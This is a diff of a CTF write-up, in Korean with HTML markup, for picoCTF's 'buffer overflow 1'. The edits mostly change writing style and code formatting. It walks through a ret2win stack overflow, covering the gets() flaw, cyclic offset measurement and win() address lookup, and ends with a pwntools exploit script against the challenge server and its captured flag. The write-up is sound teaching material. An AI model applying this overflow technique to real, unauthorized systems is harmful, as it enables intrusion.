@@ -1,6 +1,6 @@
 ---
 title: 'CTF — picoCTF: buffer overflow 1'
-date: 2026-06-04 00:00:00 +0900
+date: 2026-06-04 22:13:00 +0900
 categories:
 - CTF
 - Writeup
@@ -305,57 +305,98 @@ The next barrier is the stack canary: a random 8-byte value the compiler inserts
 <details class="kr-orig" markdown="0"><summary>🇰🇷 한국어 원문</summary><div class="kr-content">
 <h2>CTF — picoCTF: buffer overflow 1</h2>
 <blockquote>
-<p><strong>목표</strong>: <code>win()</code> 함수로 return address를 덮어써서 서버의 <code>flag.txt</code>를 읽어오는 스택 버퍼 오버플로우 익스플로잇.</p>
+<p><strong>목표</strong>: <code>win()</code> 함수로 return address를 덮어써서 서버의 <code>flag.txt</code>를 읽어오는 스택 버퍼 오버플로우 익스플로잇입니다.</p>
 <p><strong>환경</strong>: picoCTF Practice Arena (play.picoctf.org), 32-bit Linux ELF, <code>vuln.c</code> 소스 제공</p>
 <p><strong>공격 기법</strong>: Classic Stack Buffer Overflow → Return Address Overwrite (Ret2Win)</p>
 </blockquote>
 <hr />
 <h2>0. 이 문제의 위치</h2>
-<p>picoCTF buffer overflow 1은 2026-05-18-Exploit-dev-01-ret2win에서 익힌 기법의 직접 적용이다. <code>gets()</code> 오버플로우 → cyclic 오프셋 측정 → <code>win()</code> 주소 덮어쓰기, 구조가 동일하다. 실전 차이는 원격 프로세스에 보내야 한다는 것 하나다.</p>
-<p>Exploit Dev-01과 다른 두 가지:</p>
+<p>picoCTF buffer overflow 1은 Exploit Dev-01 ret2win 연구에서 익힌 기법의 직접 적용입니다. <code>gets()</code> 오버플로우 → cyclic 오프셋 측정 → <code>win()</code> 주소 덮어쓰기, 구조가 동일합니다. 실전에서 달라지는 점은 원격 프로세스에 페이로드를 보내야 한다는 것 하나입니다.</p>
+<p>Exploit Dev-01과 다른 두 가지를 미리 짚어두겠습니다.</p>
 <ul>
-<li><strong>NX가 켜져 있다.</strong> 스택에 shellcode를 넣어도 실행이 안 된다. Ret2Win은 영향 없음 — 이미 있는 코드(<code>win()</code>)로 점프할 뿐이다.</li>
-<li><strong>오프셋이 44바이트다(76이 아님).</strong> <code>BUFFSIZE=64</code>지만 컴파일러가 실제 할당하는 프레임은 40바이트. 소스 선언 크기와 실제 스택 레이아웃은 다르다.</li>
+<li><strong>NX가 켜져 있습니다.</strong> 스택에 shellcode를 넣어도 실행되지 않습니다. Ret2Win은 영향이 없습니다 — 이미 존재하는 코드(<code>win()</code>)로 점프할 뿐이기 때문입니다.</li>
+<li><strong>오프셋이 44바이트입니다(76이 아님).</strong> <code>BUFFSIZE=64</code>이지만 컴파일러가 실제 할당하는 프레임은 40바이트입니다. 소스 선언 크기와 실제 스택 레이아웃은 다릅니다.</li>
 </ul>
 <hr />
 <h2>1. 바이너리 검사</h2>
-<div class="kr-code-block"><code>$<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>./vuln<br><span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found<br><span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled<br><span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x8048000<span class="o">)</span><br></code></div>
+<pre class="highlight"><code class="language-bash">$ checksec --file=./vuln
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
 
 <ul>
-<li><strong>Canary 없음</strong> → 버퍼와 return address 사이에 검증 값 없음. 마음껏 덮어쓸 수 있다.</li>
-<li><strong>PIE 없음</strong> → 코드 영역 주소 고정. <code>win()</code> 주소가 매 실행마다 같다.</li>
-<li><strong>NX 있음</strong> → 스택 실행 불가. 하지만 shellcode를 쓸 계획이 없으므로 무관하다.</li>
+<li><strong>Canary 없음</strong> → 버퍼와 return address 사이에 검증 값이 없습니다. 마음껏 덮어쓸 수 있습니다.</li>
+<li><strong>PIE 없음</strong> → 코드 영역 주소가 고정됩니다. <code>win()</code> 주소가 매 실행마다 동일합니다.</li>
+<li><strong>NX 있음</strong> → 스택 실행이 불가합니다. 하지만 shellcode를 쓸 계획이 없으므로 무관합니다.</li>
 </ul>
 <hr />
 <h2>2. 소스 코드</h2>
-<div class="kr-code-block"><code><span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><br><span class="w">    </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">);</span><br><span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">FLAGSIZE</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span><br><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w">  </span><span class="c1">// 서버 측 flag.txt를 소켓으로 출력</span><br><span class="p">}</span><br><br><span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><br><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">BUFFSIZE</span><span class="p">];</span><span class="w">  </span><span class="c1">// BUFFSIZE = 64</span><br><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w">           </span><span class="c1">// 취약점: 길이 제한 없음</span><br><span class="p">}</span><br></code></div>
+<pre class="highlight"><code class="language-c">void win() {
+    FILE *f = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+    fgets(buf, FLAGSIZE, f);
+    printf(buf);  // 서버 측 flag.txt를 소켓으로 출력
+}
 
-<p>취약점은 <code>gets()</code>. Exploit Dev-01과 동일한 근본 원인이다. <code>win()</code>만 쉘 대신 <code>flag.txt</code>를 읽는다.</p>
+void vuln() {
+    char buf[BUFFSIZE];  // BUFFSIZE = 64
+    gets(buf);           // 취약점: 길이 제한 없음
+}
+</code></pre>
+
+<p>취약점은 <code>gets()</code>입니다. 길이 제한이 없어 입력이 버퍼를 초과하면 인접한 스택 영역을 덮어씁니다. <code>win()</code>은 쉘을 띄우는 대신 <code>flag.txt</code>를 읽어 소켓으로 출력합니다.</p>
 <hr />
 <h2>3. 1차 크래시 확인</h2>
-<div class="kr-code-block"><code>$<span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;A&#39;*200)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./vuln<br>Segmentation<span class="w"> </span>fault<span class="w"> </span><span class="o">(</span>core<span class="w"> </span>dumped<span class="o">)</span><br></code></div>
+<pre class="highlight"><code class="language-bash">$ python3 -c &quot;print('A'*200)&quot; | ./vuln
+Segmentation fault (core dumped)
+</code></pre>
 
-<p>200바이트 입력으로 Segfault. Return address까지 덮을 수 있다는 확인.</p>
+<p>200바이트 입력으로 Segfault가 발생합니다. 오버플로우가 return address까지 도달하고 있음을 확인할 수 있습니다.</p>
 <hr />
 <h2>4. 정확한 오프셋 탐색 — Cyclic Pattern</h2>
-<div class="kr-code-block"><code>pwndbg&gt;<span class="w"> </span>cyclic<span class="w"> </span><span class="m">200</span><br>aaaabaaacaaad...<span class="w"> </span><span class="o">(</span>200자<span class="w"> </span>시퀀스<span class="o">)</span><br><br>pwndbg&gt;<span class="w"> </span>r<br><span class="c1">## 패턴 입력 후 크래시</span><br><br>pwndbg&gt;<span class="w"> </span>info<span class="w"> </span>registers<br>eip<span class="w">  </span>0x6161616c<span class="w">   </span>←<span class="w"> </span><span class="s2">&quot;laaa&quot;</span><br><br>pwndbg&gt;<span class="w"> </span>cyclic<span class="w"> </span>-l<span class="w"> </span>0x6161616c<br>Found<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">44</span><br></code></div>
+<pre class="highlight"><code class="language-bash">pwndbg&gt; cyclic 200
+aaaabaaacaaad... (200자 시퀀스)
+
+pwndbg&gt; r
+## 패턴 입력 후 크래시
+
+pwndbg&gt; info registers
+eip  0x6161616c   ← &quot;laaa&quot;
+
+pwndbg&gt; cyclic -l 0x6161616c
+Found at offset 44
+</code></pre>
 
 <p><strong>오프셋 = 44.</strong></p>
 <h3>왜 68이 아니라 44인가</h3>
-<p><code>BUFFSIZE=64</code> → 예상 오프셋 68 (buf 64 + saved EBP 4). 하지만 실제 어셈블리:</p>
-<div class="kr-code-block"><code>sub esp, 0x28   ← 40바이트 할당 (64가 아님)<br>lea eax, [ebp-0x28]   ← buf 시작 위치<br></code></div>
+<p><code>BUFFSIZE=64</code> → 예상 오프셋은 68 (buf 64바이트 + saved EBP 4바이트)입니다. 하지만 실제 어셈블리를 보면 다릅니다.</p>
+<pre class="highlight"><code>sub esp, 0x28   ← 40바이트 할당 (64가 아님)
+lea eax, [ebp-0x28]   ← buf 시작 위치
+</code></pre>
 
-<p>컴파일러가 스택을 16바이트 경계로 정렬하면서 실제 프레임은 40바이트가 됐다.</p>
-<div class="kr-code-block"><code>buf(40B) + saved EBP(4B) = 44B → return address 자리<br></code></div>
+<p>컴파일러가 스택을 16바이트 경계로 정렬하면서 실제 프레임은 40바이트가 되었습니다.</p>
+<pre class="highlight"><code>buf(40B) + saved EBP(4B) = 44B → return address 자리
+</code></pre>
 
-<p>소스 코드 크기로 오프셋을 계산하면 틀린다. <strong>항상 cyclic으로 직접 측정한다.</strong></p>
-<div class="kr-code-block"><code>높은 주소<br>┌──────────────────────────────┐<br>│   return address (4 bytes)   │ ← 덮어야 할 곳<br>├──────────────────────────────┤<br>│   saved EBP (4 bytes)        │<br>├──────────────────────────────┤<br>│   buf (40 bytes)             │ ← gets() 시작, BUFFSIZE=64이나 프레임=40<br>└──────────────────────────────┘<br>낮은 주소<br></code></div>
+<p>소스 코드의 선언 크기로 오프셋을 계산하면 틀립니다. <strong>항상 cyclic으로 직접 측정합니다.</strong></p>
+<pre class="highlight"><code>높은 주소
+┌──────────────────────────────┐
+│   return address (4 bytes)   │ ← 덮어야 할 곳
+├──────────────────────────────┤
+│   saved EBP (4 bytes)        │
+├──────────────────────────────┤
+│   buf (40 bytes)             │ ← gets() 시작, BUFFSIZE=64이나 프레임=40
+└──────────────────────────────┘
+낮은 주소
+</code></pre>
 
 <hr />
 <h2>5. win() 주소 확인</h2>
-<div class="kr-code-block"><code>$<span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>./vuln<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;&lt;win&gt;:&quot;</span><br>080491f6<span class="w"> </span>&lt;win&gt;:<br></code></div>
+<pre class="highlight"><code class="language-bash">$ objdump -d ./vuln | grep &quot;&lt;win&gt;:&quot;
+080491f6 &lt;win&gt;:
+</code></pre>
 
-<p>PIE 꺼져 있으므로 주소 고정. 원격 서버에도 동일한 바이너리가 배포되므로 같은 주소.</p>
+<p>PIE가 꺼져 있으므로 주소가 고정됩니다. 원격 서버에도 동일한 바이너리가 배포되므로 같은 주소가 유효합니다.</p>
 <hr />
 <h2>6. 익스플로잇 작성</h2>
 <table>
@@ -376,29 +417,56 @@ The next barrier is the stack canary: a random 8-byte value the compiler inserts
 </tr>
 </tbody>
 </table>
-<div class="kr-code-block"><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span><br><br><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span><br><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span><br><br><span class="n">win_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">]</span><br><span class="n">offset</span> <span class="o">=</span> <span class="mi">44</span><br><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span> <span class="n">win_addr</span><span class="p">)</span><br><br><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;saturn.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>  <span class="c1"># 실제 포트로 교체</span><br><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;string: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span><br><span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span><br></code></div>
+<pre class="highlight"><code class="language-python">from pwn import *
 
-<div class="kr-code-block"><code>[*] win() @ 0x80491f6<br>picoCTF{addr3ss3s_ar3_3asy_w1th_p3da_91a52424}<br></code></div>
+elf = ELF('./vuln')
+context.binary = elf
+
+win_addr = elf.symbols['win']
+offset = 44
+payload = flat(b'A' * offset, win_addr)
+
+io = remote('saturn.picoctf.net', 65535)  # 실제 포트로 교체
+io.sendlineafter(b'string: \n', payload)
+print(io.recvall().decode())
+</code></pre>
+
+<pre class="highlight"><code>[*] win() @ 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_w1th_p3da_91a52424}
+</code></pre>
 
 <hr />
 <h2>7. 공격 흐름</h2>
-<div class="kr-code-block"><code>[1] gets(buf) 호출<br>       ↓<br>[2] 입력: 패딩 44바이트 + win() 주소 4바이트 (little-endian)<br>       ↓<br>[3] buf(40B) → saved EBP(4B) → return address(4B) 덮어쓰기<br>       ↓<br>[4] return address = 0x080491f6<br>       ↓<br>[5] vuln() 종료 → ret → EIP = win()<br>       ↓<br>[6] win()이 flag.txt 읽어 소켓으로 출력<br>       ↓<br>[7] 플래그 수신<br></code></div>
+<pre class="highlight"><code>[1] gets(buf) 호출
+       ↓
+[2] 입력: 패딩 44바이트 + win() 주소 4바이트 (little-endian)
+       ↓
+[3] buf(40B) → saved EBP(4B) → return address(4B) 덮어쓰기
+       ↓
+[4] return address = 0x080491f6
+       ↓
+[5] vuln() 종료 → ret → EIP = win()
+       ↓
+[6] win()이 flag.txt 읽어 소켓으로 출력
+       ↓
+[7] 플래그 수신
+</code></pre>
 
 <hr />
 <h2>8. 로컬 vs. 원격</h2>
-<p>페이로드는 완전히 동일하다. 차이는 출력 경로뿐:</p>
+<p>페이로드는 로컬과 원격에서 완전히 동일합니다. 차이는 출력 경로뿐입니다.</p>
 <ul>
 <li><strong>로컬</strong> (<code>process()</code>): <code>printf(buf)</code> → 터미널</li>
 <li><strong>원격</strong> (<code>remote()</code>): <code>printf(buf)</code> → 소켓 → <code>io.recvall()</code>로 수신</li>
 </ul>
-<p>pwntools의 <code>remote()</code>는 <code>process()</code>의 drop-in 대체재다.</p>
+<p>pwntools의 <code>remote()</code>는 <code>process()</code>의 drop-in 대체재입니다. 이 패턴은 이후 모든 CTF 문제에서 동일하게 적용됩니다.</p>
 <hr />
 <h2>9. 핵심 정리</h2>
-<p>두 가지 확인:</p>
+<p>이번 문제를 통해 두 가지를 확인할 수 있습니다.</p>
 <ol>
-<li><strong>Return address가 본질이다.</strong> 한 번 제어하면 목표가 로컬 쉘이든 원격 플래그 파일이든 기법은 동일하다.</li>
-<li><strong>소스 크기 ≠ 스택 레이아웃.</strong> <code>BUFFSIZE=64</code> → 예상 68, 실제 44. 컴파일러 할당(<code>sub esp, 0x28</code>)이 기준이다.</li>
+<li><strong>Return address가 본질적인 제어 지점입니다.</strong> 한 번 제어하면 목표가 로컬 쉘이든 원격 플래그 파일이든 익스플로잇 구조는 동일합니다.</li>
+<li><strong>소스 크기 ≠ 스택 레이아웃.</strong> <code>BUFFSIZE=64</code> → 예상 68, 실제 44. 컴파일러 할당(<code>sub esp, 0x28</code>)이 기준이며, 반드시 cyclic으로 직접 측정해야 합니다.</li>
 </ol>
-<p>다음 단계: Exploit-dev-04-stack-canary — canary가 buf와 return address 사이에 끼어 있으면 같은 overflow가 먼저 canary를 덮어 프로세스를 abort시킨다. 해결책은 canary 값을 먼저 leak하는 것이다.</p>
+<p>다음 단계는 stack canary 우회입니다. canary가 buf와 return address 사이에 삽입되면 같은 오버플로우가 canary를 먼저 덮어 프로세스를 abort시킵니다. 해결책은 canary 값을 먼저 leak하는 것입니다.</p>
 </div></details>
 
